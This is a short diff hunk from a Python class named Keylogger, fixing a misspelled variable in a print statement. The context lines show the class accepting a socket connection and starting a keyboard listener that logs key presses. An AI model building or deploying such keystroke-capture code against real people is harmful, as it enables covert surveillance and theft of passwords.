@@ -34,7 +34,7 @@ class Keylogger:
         self.server_socket.listen(1)
 
         self.conn, self.address = self.server_socket.accept()
-        print("Connection from: " + str(self.addres))
+        print("Connection from: " + str(self.address))
 
         self.listener = keyboard.Listener(on_press=self.log)
         self.listener.start()
